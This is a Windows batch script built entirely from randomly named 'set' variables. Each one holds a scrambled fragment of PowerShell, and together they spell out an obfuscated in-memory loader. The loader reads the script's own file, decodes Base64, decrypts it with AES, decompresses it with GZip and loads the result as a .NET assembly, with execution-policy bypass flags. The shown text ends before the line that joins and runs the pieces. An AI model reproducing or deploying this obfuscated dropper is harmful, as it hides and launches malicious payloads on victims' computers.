@echo off
set "gmrTVtLEYP=16] "
set "YBbeQhTOiu=$giM"
set "kdYROMUCCT=s.Su"
set "CqLhKxLpTw=m.Re"
set "nqbVbjGPed=esMa"
set "RyXkCyxRgY=.Dis"
set "PeWMMNdQkK=$pgV"
set "rsCkRwffUy=.Ass"
set "HijAigbHrH=Star"
set "rLTYTuPwqZ=bjec"
set "nSnONObTna=Fina"
set "gZylBHuYCF=)))"
set "PddVKqfyYY=[IO."
set "WjbGDcGTWi=PTtG"
set "vSHsdFIxzr=.Len"
set "eGAZppUlJe=wcVC"
set "AiWiScWPSd=TOs "
set "jswJiPyJju=.GZi"
set "iJkEQBhIDl= [Sy"
set "srVXoVniAj=ateD"
set "hiMKHsvqnI=fTCE"
set "YTYbldOMlL=hy.A"
set "LGqYldTNlC=[-1."
set "DBesZjOjyx=aVTO"
set "rFIZTPOoiu=DrS "
set "xhUzcPvcMk=ode]"
set "rGsrLsAjck=Ty.T"
set "DPzkYFtmOE=('%~f0'"
set "fvmihRsDTk=.Con"
set "WxmPakuvpo=GTpm"
set "SSdUKzFamR=.Dis"
set "rIKcstGwKh=.Mem"
set "mqtEuJteDz=ck($"
set "ombNsJasbr=t Sy"
set "wulqmsIhLp=106u"
set "wNUSYURrUq=a = "
set "CPzXPXjEvB=th('"
set "IdCOZCWVGj=G = "
set "WcJxwQOxcW==');"
set "FvCCrmqPMF=CFxo"
set "CDSrUNrOjT=Disp"
set "nNfwbGDOij=morF"
set "KKFKgTduAS=e = "
set "JEVKujSxjv=New-"
set "SzvGfIgkPi= [st"
set "akvIkBQYUH=1] -"
set "RPgFJjZNvY=daeR"
set "jcSZucPvpq=SeDr"
set "XrhqGfFWdf=ss -"
set "DbLBazFesz=vert"
set "BjHGyTLwfm=Ed ="
set "iliinkIhsP=tion"
set "jxVTXRIQYc=SfTC"
set "bwcdkbOPxt=y.Cr"
set "hRZlMTpSCl=$Xwc"
set "qHqjxrYaxQ=join"
set "TDVAiavwod=dj0C"
set "wwvJKBZVBu=VC.I"
set "PBWryJBURA=nirt"
set "vWqNRFncfS=fTCE"
set "mJWnwCoHaW= [Sy"
set "cSMJqHdvvN=Mode"
set "GLSTLSUwLA=iron"
set "AhyfJAEklj=.Cry"
set "xpXgWAGZMU=tem."
set "ERvFcCtqjm=.Cre"
set "LTeJrSgtjJ=] -j"
set "WBpRLOJjFs=comp"
set "vlbRRBxzDN=m.IO"
set "mXkVLNukqw=am;$"
set "yFZHHFdibD=ment"
set "CZDNyVnxYC=embl"
set "bkgvyWeOhs=tem."
set "nVrJDTqtcB=tJ);"
set "DoumYvJMBj=giME"
set "zaePzggLLw=-ep "
set "vkWSeUkuYj=3); "
set "WXkpoxIswV=;$Se"
set "aosnCMlrLG=$pQl"
set "FWRZQrsGbg=JPee"
set "WvIwvcRsGN=PKCS"
set "inpDluNLLb=Pee."
set "uTxXuTSyaw=pher"
set "uJXkWCnopX=L4Yi"
set "PDWdfykIIf=('da"
set "jHJuXCYYYH=::('"
set "sNXTJFBGiA=ose("
set "UAKblmAhyd=rt]:"
set "jyEtLuSnZM=tJ ="
set "bencuwPAJS=JG, "
set "FGANgvtGYd=1..-"
set "CTdcJVCbEq=raph"
set "fmwtyVEjiW=.Cop"
set "lpkvVmlQJa=l5E7"
set "ICVEzazAiJ=.Key"
set "AHPVuPsjDx=ne);"
set "hZUxeRovBh=oryS"
set "ciVcJeJGvp=lBlo"
set "JfFGRrwdcV=.Com"
set "wTGyQRBHGt='0Pg"
set "pttVSqfSFq=ewLi"
set "iwmMVrcRUW= if "
set "JJtocmziXM=wcVC"
set "hzheNdyFOD=ke($"
set "lkKJiKSByy=).Sp"
set "GFzRGJIPRi=m(, "
set "viiMQgRDKq=in $"
set "HDjwTIjSPE=tJ.T"
set "sZMLxWbAhj=; };"
set "WkjQwxpRwA=-1.."
set "QPVZfbiEqI='[-1"
set "uITmVKBYyj=-nop"
set "PTGDYljvCR=TllA"
set "DdxjWKlMMo=Obje"
set "PrgDXDVtVf=, (,"
set "heJJKAenaB=('%*'"
set "cdainvKaXl=XwcV"
set "nbXvIhzjTN=CE);"
set "CfJIxxeyol=pStr"
set "UvUtlLCztO=em.I"
set "xfHvkXhZfl=ecry"
set "gAAsAzOwwX=pres"
set "vUeFCiVvbG=tem."
set "tvNyhMbacw=ion."
set "pwuKaJvfHQ=BC;$"
set "hdHkFJIVIm=ra.D"
set "zFUPYDHaqo=lTy "
set "ooZjnezSUs=e]::"
set "PHKAeArsff=Stre"
set "nwYObihtXq=gsYZ"
set "iEOtIDXjcY=rtS4"
set "dEBTzQsEhk=[]] "
set "yzoDFuZqHa=$nRf"
set "gYsletlHrB=bstr"
set "CGZepESgJH=gnir"
set "FAHIyZFkol=..-1"
set "niEgaBKlAT=pose"
set "tonDkAFlDp=ress"
set "PqfezwwMLO=ose("
set "dtpMmFacUo=ay()"
set "XgvcDZnLfj=ptog"
set "zuQmlemePq=ach "
set "LAcGLqPuOu=wcVC"
set "FvczpJintt=and "
set "CtqwmwHjLE=6esa"
set "XrCJgwCOTC=stem"
set "XjATWGPWXa=gth)"
set "tknIqtKStz=TOs."
set "jtmiRwtqmy=)($S"
set "RnLnBAxRJw=eMVs"
set "byjjRmOJjw=($aV"
set "infiPZrmmZ===')"
set "NyNcUDbEjS=raph"
set "umcRuyJVpB=);$n"
set "OLHvvhvQWv=ddin"
set "SVeVhiGMZf=V = "
set "nhERSBJKQc=);$a"
